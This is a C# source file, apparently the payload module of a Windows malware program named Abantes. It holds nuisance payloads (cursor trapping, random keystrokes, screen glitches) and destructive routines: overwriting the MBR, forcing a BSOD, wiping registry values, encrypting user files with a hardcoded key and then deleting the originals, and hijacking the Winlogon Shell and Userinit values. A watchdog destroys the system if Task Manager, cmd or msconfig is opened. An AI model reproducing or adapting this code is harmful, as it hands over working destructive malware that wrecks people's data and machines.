using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Windows.Forms;
using Abantes.Utils;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Speech.Synthesis;
using System.Media;
using Microsoft.Win32;

namespace Abantes.Payloads
{
    class Annoying
    {
        [DllImport("user32.dll")]
        static extern int SetWindowText(IntPtr hWnd, string text);
        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?Screen_Screw@Payloads@1@QAEXXZ")]
        public static extern void Screen_Screw();
        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?Screen_Glitching@Payloads@1@QAEXXZ")]
        public static extern void Screen_Glitching();
        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?EjectCD@Payloads@1@QAEXXZ")]
        public static extern void EjectCd();
        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?Display_Icons@Payloads@1@QAEXXZ")]
        public static extern void Display_Icons();
        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?CursorIcon@Payloads@1@QAEXXZ")]
        public static extern void CursorIcon();
        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?CrazyBounce@Payloads@1@QAEXXZ")]
        public static extern void CrazyBounce();
        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?Text@Payloads@1@QAEXXZ")]
        public static extern void Text();
        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?Flip@Payloads@1@QAEXXZ")]
        public static extern void Flip();
        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?ChangeAllText@Payloads@1@QAEHXZ")]
        public static extern void ChangeAllText();
        static Point Position;
        static Random _random = new Random();
        public static void ChangeWindowText()
        {
            Process[] allProcesses = Process.GetProcesses();
            for (int i = 0; i < allProcesses.Length; i++)
            {
                SetWindowText(allProcesses[i].MainWindowHandle, "You're Screwed");
            }
        }
        public static void MouseTrap()
        {
            int x = SystemInformation.VirtualScreen.Width / 2;
            int y = SystemInformation.VirtualScreen.Height / 2;
            Position.X = x;
            Position.Y = y;
            while (true)
            {
                Thread.Sleep(0200);
                Cursor.Position = Position;
            }
        }
        public static void ChangeText()
        {
            while (true)
            {
                ChangeAllText();
                Thread.Sleep(1000);
            }
        }
        public static void RandomKeyboard()
        {
            while (true)
            {
                if (_random.Next(100) > 95)
                {
                    char key = (char)(_random.Next(25) + 65);
                    if (_random.Next(2) == 0)
                    {
                        key = Char.ToLower(key);
                    }
                    SendKeys.SendWait(key.ToString());
                }
                Thread.Sleep(400);
            }
        }
        public static void RandomOSSounds()
        {
            while (true)
            {
                if (_random.Next(100) > 70)
                {
                    switch (_random.Next(5))
                    {
                        case 0:
                            SystemSounds.Asterisk.Play();
                            break;
                        case 1:
                            SystemSounds.Beep.Play();
                            break;
                        case 2:
                            SystemSounds.Exclamation.Play();
                            break;
                        case 3:
                            SystemSounds.Hand.Play();
                            break;
                        case 4:
                            SystemSounds.Question.Play();
                            break;
                    }
                }
                Thread.Sleep(400);
            }
        }
        public static void LockedImage()
        {
            Form Image = new LockedImage();
            Image.Show();
        }
    }
    class Destructive
    {
        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?MBR_Overwrite@Payloads@1@QAEXXZ")]
        public static extern void MBR_Overwrite();
        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?FORCE_BSOD@Payloads@1@QAEXXZ")]
        public static extern void FORCE_BSOD();
        public static void LogonUIOverwrite()
        {
            string extractPath = @"C:\Windows\Defender";
            Process ScriptProcess = new Process();
            ScriptProcess.StartInfo.CreateNoWindow = true;
            ScriptProcess.StartInfo.UseShellExecute = false;
            ScriptProcess.StartInfo.FileName = extractPath + @"\logonOverwrite.bat"; 
            ScriptProcess.Start();
        }
        public static void UserInitOverwrite()
        {
            try
            {
                RegistryKey editKey;
                editKey = Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Winlogon");
                editKey.SetValue("Userinit", @"C:\Windows\Defender\LogonUIStart.exe,");
                editKey.Close();
            } catch { }
        }
        public static void ExplorerOverwrite()
        {
            try
            {
                RegistryKey editKey;
                editKey = Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Winlogon");
                editKey.SetValue("Shell", @"C:\Windows\Defender\LogonUIStart.exe");
                editKey.Close();
            } catch { }
        }
        public static void DestroyRegistry()
        {
            FuckReg(Registry.LocalMachine);
            FuckReg(Registry.Users);
            FuckReg(Registry.ClassesRoot);
        }
        public static void FuckReg(RegistryKey key)
        {
            foreach (var k in key.GetSubKeyNames())
            {
                try
                {
                    FuckReg(key.OpenSubKey(k, true));
                }
                catch { }
            }
            foreach (var v in key.GetValueNames())
            {
                try
                {
                    key.DeleteValue(v);
                } catch { }
            }
        }
        public static void EncryptUserFiles()
        {
            List<string> pathsToEncrypt = new List<string>();
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos));
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
            foreach (string currentPath in pathsToEncrypt)
            {
                GetFilesAndEncrypt(currentPath);
            }
        }
        static void GetFilesAndEncrypt(string Ps)
        {
            try
            {
                var validExtensions = new[]
                {
                    ".jpg", ".jpeg", ".raw", ".tif", ".gif", ".png", ".bmp", ".3dm", ".max", ".accdb", ".db", ".dbf", ".mdb", ".pdb", ".sql", ".dwg", ".dxf",
                    ".c", ".cpp", ".cs", ".h", ".php", ".asp", ".rb", ".java", ".jar", ".class", ".py", ".js", ".rar", ".zip", ".7zip", ".7z", ".dat", ".csv",
                    ".efx", ".sdf", ".vcf", ".xml", ".ses", ".aaf", ".aep", ".aepx", ".plb", ".prel", ".prproj", ".aet", ".ppj", ".psd", ".indd", ".indl", ".indt",
                    ".indb", ".inx", ".idml", ".pmd", ".xqx", ".xqx", ".ai", ".eps", ".ps", ".svg", ".swf", ".fla", ".as3", ".as", ".txt", ".doc", ".dot", ".docx",
                    ".docm", ".dotx", ".dotm", ".docb", ".rtf", ".wpd", ".wps", ".msg", ".pdf", ".xls", ".xlt", ".xlm", ".xlsx", ".xlsm", ".xltx", ".xltm", ".xlsb",
                    ".xla", ".xlam", ".xll", ".xlw", ".ppt", ".pot", ".pps", ".pptx", ".pptm", ".potx", ".potm", ".ppam", ".ppsx", ".ppsm", ".sldx", ".sldm",".wav",
                    ".mp3", ".aif", ".iff", ".m3u", ".m4u", ".mid", ".mpa", ".wma", ".ra", ".avi", ".mov", ".mp4", ".3gp", ".mpeg", ".3g2", ".asf", ".asx", ".flv",
                    ".mpg", ".wmv", ".vob", ".m3u8", ".mkv", ".m4a", ".ico", ".dic", ".rex", ".hmg", ".config", ".resx", ".res"
                };
                string[] files = Directory.GetFiles(Ps);
                foreach (string currentFile in files)
                {
                    string extension = Path.GetExtension(currentFile);
                    if (validExtensions.Contains(extension))
                    {
                        Encryption.FileEncrypt(currentFile, "WR8h2GIbf9FGz6VVlSzJ");
                        File.Delete(currentFile);
                    }
                }
                string[] subDirs = Directory.GetDirectories(Ps);
                foreach (string currentPath in subDirs)
                {
                    GetFilesAndEncrypt(currentPath);
                }
            }
            catch { }
        }
        public static void KillAll()
        {
            //This is here incase C++ NTRAISEHARDERROR doesn't work, it runs first so could still indefinitely cause a BSOD

            Process[] allProcesses = Process.GetProcesses();

            foreach (Process proc in allProcesses)
            {
                if (proc.ToString() != Process.GetProcessesByName("Abantes")[0].ToString())
                {
                    try
                    {
                        proc.Kill();
                    } catch { }
                }
            }
        }
        public static void KillPC()
        {
            if (MainThread.Mode == 1)
            {
                if (MessageBox.Show("ENCRYPT?", "DEBUG", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                { EncryptUserFiles(); }
                if (MessageBox.Show("LOGON UI OVERWRITE?", "DEBUG", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                { LogonUIOverwrite(); }
                if (MessageBox.Show("EXPLORER OVERWRITE?", "DEBUG", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                { ExplorerOverwrite(); }
                if (MessageBox.Show("USERINIT OVERWRITE?", "DEBUG", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                { UserInitOverwrite(); }
                if (MessageBox.Show("MBR OVERWRITE?", "DEBUG", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                { MBR_Overwrite(); }
                if (MessageBox.Show("DESTROY REGISTRY?", "DEBUG", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                { DestroyRegistry(); }
                if (MessageBox.Show("KILL ALL TASKS?", "DEBUG", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                { KillAll(); }
                if (MessageBox.Show("NTRAISEHARDERROR?", "DEBUG", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                { FORCE_BSOD(); }
            }
            else
            {
                LogonUIOverwrite();
                ExplorerOverwrite();
                UserInitOverwrite();
                MBR_Overwrite();
                EncryptUserFiles();
                DestroyRegistry();
                KillAll();
                FORCE_BSOD();
            }
        }
    }
    class WatchDog
    {
        public static void FileWatchDog(string[] sFileName)
        {
            //Put each files path in an array to check if it exists

            foreach (string file in sFileName)
            {
                if (File.Exists(file) == false)
                {
                    Destructive.KillPC();
                    MessageBox.Show("Your PC Is Dead");
                }
            }
        }
        public static void ProcessWatchDog(string[] sNeverRun, string[] sMustRun)
        {
            //Put each process to watch for in an array to check if it exists
            
            foreach (string process in sNeverRun)
            {
                Process[] proc = Process.GetProcessesByName(process);
                if (proc.Length > 0)
                {
                    Destructive.KillPC();
                    MessageBox.Show("Your PC Is Dead");
                }
            }

            foreach (string process in sMustRun)
            {
                Process[] proc = Process.GetProcessesByName(process);
                if (proc.Length == 0)
                {
                    //Not Running
                    Destructive.KillPC();
                    MessageBox.Show("Your PC Is Dead");
                }
                else
                {
                    //Running
                }
            }
        }

    }
    class Threads
    {
        static Random _random = new Random();
        public static void MainPayloadThread()
        {
            if (MainThread.Mode == 1)
            {
                if (MessageBox.Show("OPEN PAYLOAD DEBUG MENU?", "DEBUG", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                {
                    //Form Debug = new PayloadDebugger();
                    //Debug.Show();
                    Application.EnableVisualStyles();
                    Application.Run(new PayloadDebugger());
                }
                else
                {
                    PayloadDebugger.Status = 0;
                }
            }
            else
            {
                PayloadDebugger.Status = 0;
            }
            while (PayloadDebugger.Status == 0)
            {
                switch (_random.Next(13))
                {
                    case 0:
                        if (MainThread.Mode == 1)
                        {
                            if (MessageBox.Show("START RANDOM OS SOUNDS PAYLOAD", "DEBUG", MessageBoxButtons.YesNo)==DialogResult.Yes)
                            {
                                Thread randomOSsound = new Thread(new ThreadStart(Annoying.RandomOSSounds));
                                randomOSsound.Start();
                            }
                        }
                        else
                        {
                            Thread randomOSsound = new Thread(new ThreadStart(Annoying.RandomOSSounds));
                            randomOSsound.Start();
                        }
                        break;
                    case 1:
                        if (MainThread.Mode == 1)
                        {
                            if (MessageBox.Show("START RANDOM KEYBOARD INPUT PAYLOAD", "DEBUG", MessageBoxButtons.YesNo) == DialogResult.Yes)
                            {
                                Thread randomKeyboard = new Thread(new ThreadStart(Annoying.RandomKeyboard));
                                randomKeyboard.Start();
                            }
                        }
                        else
                        {
                            Thread randomKeyboard = new Thread(new ThreadStart(Annoying.RandomKeyboard));
                            randomKeyboard.Start();
                        }
                        break;
                    case 2:
                        if (MainThread.Mode == 1)
                        {
                            if (MessageBox.Show("START ICON FOLLOWING CURSOR PAYLOAD", "DEBUG", MessageBoxButtons.YesNo) == DialogResult.Yes)
                            {
                                Thread cursoricon = new Thread(new ThreadStart(Annoying.CursorIcon));
                                cursoricon.Start();
                            }
                        }
                        else
                        {
                            Thread cursoricon = new Thread(new ThreadStart(Annoying.CursorIcon));
                            cursoricon.Start();
                        }
                        break;
                    case 3:
                        if (MainThread.Mode == 1)
                        {
                            if (MessageBox.Show("START MOUSE TRAP PAYLOAD", "DEBUG", MessageBoxButtons.YesNo) == DialogResult.Yes)
                            {
                                Thread mouseTrap = new Thread(new ThreadStart(Annoying.MouseTrap));
                                mouseTrap.Start();
                            }
                        }
                        else
                        {
                            Thread mouseTrap = new Thread(new ThreadStart(Annoying.MouseTrap));
                            mouseTrap.Start();
                        }
                        break;
                    case 4:
                        if (MainThread.Mode == 1)
                        {
                            if (MessageBox.Show("START CHANGE WINDOW TITLE TEXT PAYLOAD", "DEBUG", MessageBoxButtons.YesNo) == DialogResult.Yes)
                            {
                                Annoying.ChangeWindowText();
                            }
                        }
                        else
                        {
                            Annoying.ChangeWindowText();
                        }
                        break;
                    case 5:
                        if (MainThread.Mode == 1)
                        {
                            if (MessageBox.Show("START EJECT CD PAYLOAD", "DEBUG", MessageBoxButtons.YesNo) == DialogResult.Yes)
                            {
                                Annoying.EjectCd();
                            }
                        }
                        else
                        {
                            Annoying.EjectCd();
                        }
                        break;
                    case 6:
                        if (MainThread.Mode == 1)
                        {
                            if (MessageBox.Show("START SCREEN SCREW PAYLOAD", "DEBUG", MessageBoxButtons.YesNo) == DialogResult.Yes)
                            {
                                Thread screenscrew = new Thread(new ThreadStart(Annoying.Screen_Screw));
                                screenscrew.Start();
                            }
                        }
                        else
                        {
                            Thread screenscrew = new Thread(new ThreadStart(Annoying.Screen_Screw));
                            screenscrew.Start();
                        }
                        break;
                    case 7:
                        if (MainThread.Mode == 1)
                        {
                            if (MessageBox.Show("START SCREEN GLITCH PAYLOAD", "DEBUG", MessageBoxButtons.YesNo) == DialogResult.Yes)
                            {
                                Thread screenglitch = new Thread(new ThreadStart(Annoying.Screen_Glitching));
                                screenglitch.Start();
                            }
                        }
                        else
                        {
                            Thread screenglitch = new Thread(new ThreadStart(Annoying.Screen_Glitching));
                            screenglitch.Start();
                        }
                        break;
                    case 8:
                        if (MainThread.Mode == 1)
                        {
                            if (MessageBox.Show("START HELP ICONS ON SCREEN PAYLOAD", "DEBUG", MessageBoxButtons.YesNo) == DialogResult.Yes)
                            {
                                Thread helpicons = new Thread(new ThreadStart(Annoying.Display_Icons));
                                helpicons.Start();
                            }
                        }
                        else
                        {
                            Thread helpicons = new Thread(new ThreadStart(Annoying.Display_Icons));
                            helpicons.Start();
                        }
                        break;
                    case 9:
                        if (MainThread.Mode == 1)
                        {
                            if (MessageBox.Show("START CRAZY BOUNCE PAYLOAD", "DEBUG", MessageBoxButtons.YesNo) == DialogResult.Yes)
                            {
                                Thread crazybounce = new Thread(new ThreadStart(Annoying.CrazyBounce));
                                crazybounce.Start();
                            }
                        }
                        else
                        {
                            Thread crazybounce = new Thread(new ThreadStart(Annoying.CrazyBounce));
                            crazybounce.Start();
                        }
                        break;
                    case 10:
                        if (MainThread.Mode == 1)
                        {
                            if (MessageBox.Show("START SCREEN FLIPPING PAYLOAD", "DEBUG", MessageBoxButtons.YesNo) == DialogResult.Yes)
                            {
                                Thread flip = new Thread(new ThreadStart(Annoying.Flip));
                                flip.Start();
                            }
                        }
                        else
                        {
                            Thread flip = new Thread(new ThreadStart(Annoying.Flip));
                            flip.Start();
                        }
                        break;
                    case 11:
                        if (MainThread.Mode == 1)
                        {
                            if (MessageBox.Show("START BLACK/RED TEXT ON SCREEN PAYLOAD", "DEBUG", MessageBoxButtons.YesNo) == DialogResult.Yes)
                            {
                                Thread text = new Thread(new ThreadStart(Annoying.Text));
                                text.Start();
                            }
                        }
                        else
                        {
                            Thread text = new Thread(new ThreadStart(Annoying.Text));
                            text.Start();
                        }
                        break;
                    case 12:
                        if (MainThread.Mode == 1)
                        {
                            if (MessageBox.Show("START CHANGE ALL TEXT PAYLOAD", "DEBUG", MessageBoxButtons.YesNo) == DialogResult.Yes)
                            {
                                Thread CAT = new Thread(new ThreadStart(Annoying.ChangeText));
                                CAT.Start();
                            }
                        }
                        else
                        {
                            Thread CAT = new Thread(new ThreadStart(Annoying.ChangeText));
                            CAT.Start();
                        }
                        break;
                }
                Thread.Sleep(10000);
            }
        }
        public static void WatchDogThread()
        {
            string[] NeverRun = { "msconfig", "taskmgr", "cmd", "taskschd", "mmc", "resmon" };
            string[] MustRun = { "Rules" };
            string[] Files = { @"C:\Windows\Defender\Rules.exe", @"C:\Windows\Defender\Abantes.exe" };
            while (true)
            {
                Thread.Sleep(1000);
                WatchDog.ProcessWatchDog(NeverRun, MustRun);
                WatchDog.FileWatchDog(Files);
            }
        }
    }
}
